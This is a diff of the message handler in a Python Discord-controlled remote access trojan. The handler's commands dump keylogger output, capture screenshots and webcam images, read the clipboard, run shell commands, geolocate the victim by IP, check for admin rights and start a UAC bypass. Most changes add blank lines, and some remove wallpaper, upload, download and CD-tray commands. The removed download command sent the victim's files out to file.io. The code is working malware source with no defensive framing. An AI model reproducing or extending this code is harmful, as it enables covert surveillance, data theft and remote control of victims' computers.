@@ -210,6 +210,7 @@ async def on_message(message):
                     await message.channel.send(f"[*] {message.content[6:]} killed.")
             except:
                 await message.channel.send(f"[!] {message.content[6:]} is invalid,please enter a valid session name")
+
         if message.content == "!dumpkeylogger":
             import os
             temp = os.getenv("TEMP")
@@ -217,10 +218,12 @@ async def on_message(message):
             file = discord.File(file_keys, filename="key_log.txt")
             await message.channel.send("[*] Command successfuly executed", file=file)
             os.popen(f"del {file_keys}")
+
         if message.content == "!exit":
             import sys
             uncritproc()
             sys.exit()
+
         if message.content == "!windowstart":
             import threading
             global stop_threads
@@ -229,11 +232,13 @@ async def on_message(message):
             _thread = threading.Thread(target=between_callback, args=(client,))
             _thread.start()
             await message.channel.send("[*] Window logging for this session started")
+
         if message.content == "!windowstop":
             stop_threads = True
             await message.channel.send("[*] Window logging for this session stopped")
             game = discord.Game(f"Window logging stopped")
             await client.change_presence(status=discord.Status.online, activity=game)
+
         if message.content == "!screenshot":
             import os
             from mss import mss
@@ -244,12 +249,15 @@ async def on_message(message):
             file = discord.File((path), filename="monitor.png")
             await message.channel.send("[*] Command successfuly executed", file=file)
             os.remove(path)
+
         if message.content == "!volumemax":
             volumeup()
             await message.channel.send("[*] Volume put to 100%")
+
         if message.content == "!volumezero":
             volumedown()
             await message.channel.send("[*] Volume put to 0%")
+
         if message.content == "!webcampic":
             import os
             import time
@@ -263,6 +271,7 @@ async def on_message(message):
             del(camera)
             file = discord.File(temp + r"\\temp.png", filename="temp.png")
             await message.channel.send("[*] Command successfuly executed", file=file)
+
         if message.content.startswith("!message"):
             import ctypes
             import time
@@ -297,16 +306,7 @@ async def on_message(message):
                 if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                     win32gui.EnumWindows(winEnumHandler, None)
             win32gui.EnumWindows(get_all_hwnd, 0)
-        if message.content.startswith("!wallpaper"):
-            import ctypes
-            import os
-            path = os.path.join(os.getenv('TEMP') + r"\\temp.jpg")
-            await message.attachments[0].save(path)
-            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
-            await message.channel.send("[*] Command successfuly executed")
-        if message.content.startswith("!upload"):
-            await message.attachments[0].save(message.content[8:])
-            await message.channel.send("[*] Command successfuly executed")
+
         if message.content.startswith("!shell"):
             global status
             import time
@@ -347,26 +347,12 @@ async def on_message(message):
             else:
                 await message.channel.send("[*] Command not recognized or no output was obtained")
                 status = None
-        if message.content.startswith("!download"):
-            import subprocess
-            import os
-            filename = message.content[10:]
-            check2 = os.stat(filename).st_size
-            if check2 > 7340032:
-                import requests
-                await message.channel.send("this may take some time becuase it is over 8 MB. please wait")
-                response = requests.post(
-                    'https://file.io/', files={"file": open(filename, "rb")}).json()["link"]
-                await message.channel.send("download link: " + response)
-                await message.channel.send("[*] Command successfuly executed")
-            else:
-                file = discord.File(
-                    message.content[10:], filename=message.content[10:])
-                await message.channel.send("[*] Command successfuly executed", file=file)
+
         if message.content.startswith("!cd"):
             import os
             os.chdir(message.content[4:])
             await message.channel.send("[*] Command successfuly executed")
+
         if message.content == "!help":
             import os
             temp = (os.getenv('TEMP'))
@@ -378,12 +364,14 @@ async def on_message(message):
                                 filename="helpmenu.txt")
             await message.channel.send("[*] Command successfuly executed", file=file)
             os.system(r"del %temp%\helpmenu.txt /f")
+
         if message.content.startswith("!write"):
             import pyautogui
             if message.content[7:] == "enter":
                 pyautogui.press("enter")
             else:
                 pyautogui.typewrite(message.content[7:])
+
         if message.content == "!clipboard":
             import ctypes
             import os
@@ -404,6 +392,7 @@ async def on_message(message):
                 body = value.decode()
                 user32.CloseClipboard()
                 await message.channel.send("[*] Command successfuly executed : " + "Clipboard content is : " + str(body))
+
         if message.content == "!sysinfo":
             import platform
             jak = str(platform.uname())
@@ -412,6 +401,7 @@ async def on_message(message):
             ip = get('https://api.ipify.org').text
             pp = "IP Address = " + ip
             await message.channel.send("[*] Command successfuly executed : " + intro + pp)
+
         if message.content == "!geolocate":
             import urllib.request
             import json
@@ -419,6 +409,7 @@ async def on_message(message):
                 data = json.loads(url.read().decode())
                 link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                 await message.channel.send("[*] Command successfuly executed : " + link)
+
         if message.content == "!admincheck":
             import ctypes
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -426,6 +417,7 @@ async def on_message(message):
                 await message.channel.send("[*] Congrats you're admin")
             elif is_admin == False:
                 await message.channel.send("[!] Sorry, you're not admin")
+
         if message.content == "!uacbypass":
             import winreg
             import ctypes
@@ -1184,17 +1176,7 @@ username: {username}({user_id})
                     if message.content == ('!decode') and full_path.endswith('.rip'):
                         decode(full_path)
                         await message.channel.send("[*] Command successfuly executed")
-                        
-        if message.content == "!ejectcd":
-            import ctypes
-            return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door open', None, 0, None)
-            await message.channel.send("[*] Command successfuly executed")
-            
-        if message.content == "!retractcd":
-            import ctypes
-            return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door closed', None, 0, None)
-            await message.channel.send("[*] Command successfuly executed")
-            
+
         if message.content == "!critproc":
             import ctypes
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
